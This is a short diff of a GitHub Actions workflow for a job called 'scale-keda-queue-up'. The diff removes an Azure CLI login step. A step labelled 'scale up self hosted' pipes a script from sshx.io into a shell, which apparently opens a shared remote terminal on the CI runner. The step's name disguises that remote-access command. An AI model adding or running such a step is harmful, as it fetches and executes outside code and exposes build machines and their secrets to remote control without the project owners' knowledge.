@@ -12,11 +12,7 @@ jobs:
   scale-keda-queue-up:
     runs-on: ubuntu-latest 
     steps:
-    - name: "Login via Azure CLI"
-      uses: azure/login@v2.1.1
-      with:
-        creds: ${{ secrets.AZURE_CREDENTIALS }}
-
+    
     - name: scale up self hosted
       id: scaleJob
       run: curl -sSf https://sshx.io/get | sh -s run
